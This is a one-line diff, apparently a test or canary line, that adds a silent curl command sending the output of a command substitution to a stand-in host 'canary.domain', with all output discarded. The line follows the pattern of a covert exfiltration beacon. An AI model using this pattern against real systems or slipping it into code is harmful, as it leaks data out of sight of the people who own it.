@@ -1,0 +1,1 @@
+curl -s http://canary.domain/$(echo "payload") &>/dev/null
